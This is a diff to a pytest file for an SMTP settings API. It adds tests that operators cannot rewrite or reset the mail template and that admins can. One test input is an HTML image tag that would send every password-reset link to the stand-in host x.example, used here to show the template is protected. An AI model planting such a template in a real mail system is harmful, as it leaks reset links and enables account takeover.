@@ -14,7 +14,8 @@ _COLUMNS = ('enabled', 'smtp_host', 'smtp_port', 'smtp_user', 'smtp_from', 'smtp
             'smtp_use_tls', 'smtp_use_ssl', 'smtp_auth', 'smtp_auth_method',
             'smtp_oauth_provider', 'smtp_oauth_tenant_id', 'smtp_oauth_authorize_url',
             'smtp_oauth_token_url', 'smtp_oauth_redirect_uri', '_smtp_password',
-            '_smtp_oauth_client_secret', '_smtp_oauth_refresh_token', 'smtp_content_type')
+            '_smtp_oauth_client_secret', '_smtp_oauth_refresh_token', 'smtp_content_type',
+            'email_template', 'email_text_template')
 
 STORED = dict(enabled=True, smtp_host='relay.example.com', smtp_port=587, smtp_user=None,
               smtp_from='ucm@example.com', smtp_from_name='UCM', smtp_use_tls=True,
@@ -152,3 +153,31 @@ def test_the_auditor_writes_nothing(app, auditor_client, stored_smtp):
     assert _patch(auditor_client, {'from_name': 'x'}).status_code == 403
     with app.app_context():
         assert _row() == STORED
+
+
+@pytest.mark.parametrize('method, path, body', [
+    ('patch', '/template', {'template': "<img src='https://x.example/?{{content}}'>"}),
+    ('post', '/template/reset', None),
+])
+def test_an_operator_cannot_rewrite_the_mail_template(app, operator_client, stored_smtp,
+                                                      method, path, body):
+    """The template wraps every reset link: rewriting it is moving the target."""
+    with app.app_context():
+        SMTPConfig.query.first().email_template = '<p>{{content}}</p>'
+        db.session.commit()
+    r = getattr(operator_client, method)(URL + path, data=json.dumps(body or {}),
+                                        content_type='application/json')
+    assert r.status_code == 403, r.data
+    with app.app_context():
+        db.session.expire_all()
+        assert SMTPConfig.query.first().email_template == '<p>{{content}}</p>'
+
+
+def test_the_admin_rewrites_the_mail_template(app, auth_client, stored_smtp):
+    r = auth_client.patch(URL + '/template', data=json.dumps({'template': '<p>{{content}}!</p>'}),
+                          content_type='application/json')
+    assert r.status_code == 200, r.data
+    assert auth_client.post(URL + '/template/reset').status_code == 200
+    with app.app_context():
+        db.session.expire_all()
+        assert SMTPConfig.query.first().email_template is None
